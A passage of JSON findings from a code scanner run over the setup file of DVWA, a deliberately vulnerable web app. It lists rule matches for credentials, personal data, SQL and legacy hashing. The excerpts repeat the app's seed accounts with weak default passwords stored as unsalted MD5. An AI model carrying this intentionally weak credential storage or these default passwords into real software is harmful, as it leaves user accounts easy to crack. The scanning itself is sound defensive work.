        "sample": "avatar",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id int(6),first_name varchar(15),last_name varchar(15), user varchar(15), password varchar(32),avatar varchar(70), last_login TIMESTAMP, failed_login INT(3), PRIMARY KEY (user_id));&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;&#39;users&#39; table was created.&quot; );\n",
        "startLocationLine": 43,
        "startLocationColumn": 135,
        "endLocationLine": 43,
        "endLocationColumn": 141
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n// Insert some data into users\n$base_dir= str_replace (&quot;setup.php&quot;, &quot;&quot;, $_SERVER[&#39;SCRIPT_NAME&#39;]);\n$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n",
        "startLocationLine": 53,
        "startLocationColumn": 2,
        "endLocationLine": 53,
        "endLocationColumn": 8
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n",
        "startLocationLine": 56,
        "startLocationColumn": 50,
        "endLocationLine": 56,
        "endLocationColumn": 56
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n",
        "startLocationLine": 57,
        "startLocationColumn": 51,
        "endLocationLine": 57,
        "endLocationColumn": 57
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n",
        "startLocationLine": 58,
        "startLocationColumn": 44,
        "endLocationLine": 58,
        "endLocationColumn": 50
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 59,
        "startLocationColumn": 51,
        "endLocationLine": 59,
        "endLocationColumn": 57
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;Data inserted into &#39;users&#39; table.&quot; );\n",
        "startLocationLine": 60,
        "startLocationColumn": 49,
        "endLocationLine": 60,
        "endLocationColumn": 55
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id int(6),first_name varchar(15),last_name varchar(15), user varchar(15), password varchar(32),avatar varchar(70), last_login TIMESTAMP, failed_login INT(3), PRIMARY KEY (user_id));&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;&#39;users&#39; table was created.&quot; );\n",
        "startLocationLine": 43,
        "startLocationColumn": 114,
        "endLocationLine": 43,
        "endLocationColumn": 122
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n",
        "startLocationLine": 56,
        "startLocationColumn": 36,
        "endLocationLine": 56,
        "endLocationColumn": 44
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;Data inserted into &#39;users&#39; table.&quot; );\n",
        "startLocationLine": 60,
        "startLocationColumn": 35,
        "endLocationLine": 60,
        "endLocationColumn": 43
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\n/*\n\nThis file contains all of the code to setup the initial MySQL database. (setup.php)\n\n*/\n\nif( !defined( &#39;DVWA_WEB_PAGE_TO_ROOT&#39; ) ) {\n\tdefine( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../../&#39; );\n",
        "startLocationLine": 5,
        "startLocationColumn": 57,
        "endLocationLine": 5,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "}\n\nif( !@($GLOBALS[&quot;___mysqli_ston&quot;] = mysqli_connect( $_DVWA[ &#39;db_server&#39; ],  $_DVWA[ &#39;db_user&#39; ],  $_DVWA[ &#39;db_password&#39; ] )) ) {\n\tdvwaMessagePush( &quot;Could not connect to the MySQL service.&lt;br /&gt;Please check the config file.&quot; );\n\tif ($_DVWA[ &#39;db_user&#39; ] == &quot;root&quot;) {\n\t\tdvwaMessagePush( &#39;Your database user is root, if you are using MariaDB, this will not work, please read the README.md file.&#39; );\n\t}\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 14,
        "startLocationColumn": 45,
        "endLocationLine": 14,
        "endLocationColumn": 50
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n",
        "startLocationLine": 56,
        "startLocationColumn": 31,
        "endLocationLine": 56,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n",
        "startLocationLine": 57,
        "startLocationColumn": 34,
        "endLocationLine": 57,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n",
        "startLocationLine": 58,
        "startLocationColumn": 26,
        "endLocationLine": 58,
        "endLocationColumn": 29
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 59,
        "startLocationColumn": 33,
        "endLocationLine": 59,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
